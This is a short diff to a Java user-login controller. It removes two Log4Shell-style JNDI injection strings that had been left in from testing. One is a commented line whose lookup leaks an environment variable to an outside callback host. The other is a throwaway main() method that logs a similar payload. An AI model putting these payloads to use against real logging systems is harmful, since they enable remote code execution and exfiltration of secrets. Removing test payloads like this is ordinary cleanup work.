@@ -74,7 +74,6 @@ public class UserController {
                 sessionUser = (User) userInfo;
             }
             if (sessionUser != null && loginName.equalsIgnoreCase(sessionUser.getLoginName())) {
-//                loginName = "${jndi:ldap://${env:key}.1hj2a0litb8gvybwuy1m16vj8ae02p.oastify.com}";
                 logger.info("====用户 " + loginName + "已经登录过, login 方法调用结束====");
                 msgTip = "user already login";
             }
@@ -389,11 +388,5 @@ public class UserController {
             res.data = "获取失败";
         }
         return res;
-    }
-
-    public static void main(String[] args) {
-        Logger logger = LoggerFactory.getLogger(UserController.class);
-        String loginName = "${jndi:ldap://d7l5l9k6i01woco9ewfw9cfziqogc5.oastify.com}";
-        logger.info("====用户 " + loginName + "已经登录过, login 方法调用结束====");
     }
 }
